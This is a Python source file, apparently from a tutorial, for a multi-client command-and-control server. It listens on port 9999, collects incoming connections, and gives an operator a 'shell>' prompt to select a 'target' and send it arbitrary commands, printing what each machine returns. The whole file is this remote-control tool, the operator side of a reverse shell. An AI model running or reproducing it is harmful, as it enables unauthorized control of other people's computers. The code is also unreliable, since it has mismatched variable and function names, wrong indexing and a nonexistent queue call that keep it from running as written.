#server program using multi-thread
import socket
import sys
import threading
import time
from queue import Queue

NO_OF_THREADS=2
JOB_NO=[1,2]
queue=Queue()
all_connection=[]
all_address=[]

#create socket
def create_socket():
    try:
        global host
        global port
        global s
        host=""
        port=9999
        s=socket.socket()

    except socket.error as msg:
        print("Socket Creation Error"+str(msg))

#binding socket    
    
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port "+str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding Error"+str(msg)+"\n"+"Retrying.....")
        bind_socket()
        
#Connnection from multi-clients & save to list
#closing last connection when server.py started

def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn,address=s.accept()
            s.setblocking(1)

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")

#interactive prompt

def start_shell():
    
    
    while True:
        cmd=input('shell> ')

        if cmd=='list':
            list_connections()

        elif 'select' in cmd:
            conn=get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognised")

#Display all active connections

def list_connections():
    results=''
   
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)

        except:
            del all_connections[i]
            del all_address[i]
            continue
        
        results=str(i)+" "+str(all_address[i][0])+" "+str(all_address[i][i])+"\n"

    print("-------Clients--------------"+"\n"+results)

#select target
def get_target(cmd):
    try:
        target=cmd.replace('select ','')
        target=int(target)
        conn=all_connections[target]
        print("Successfully Connected to: "+str(all_address[target][0]))
        print(str(all_address[target][0])+">",end="")
        return conn

    except:
        print("Invalid Selection")
        

#send the command to client 
def send_target_commands(conn):
    while True:
        try:
            cmd=input()
            if cmd== 'quit':
                break
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_response=str(conn.recv(1024),"utf-8")
                print(client_response,end="")
        except:
            print("Error in Sending Commands")
            break

#create worker threads
def create_worker():
    for _ in range(NO_OF_THREADS):
        t=threading.Thread(target=work)
        t.daemon=True #to clear memory space
        t.start()

#Do next job in queue
def work():
    while True:
        x=queue.get()
        if x==1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x==2:
            start_shell()

        queue.task.put(x)

def create_job():
    for x in JOB_NO:
        queue.put(x)

    queue.join()


    
create_worker()
create_job()

        
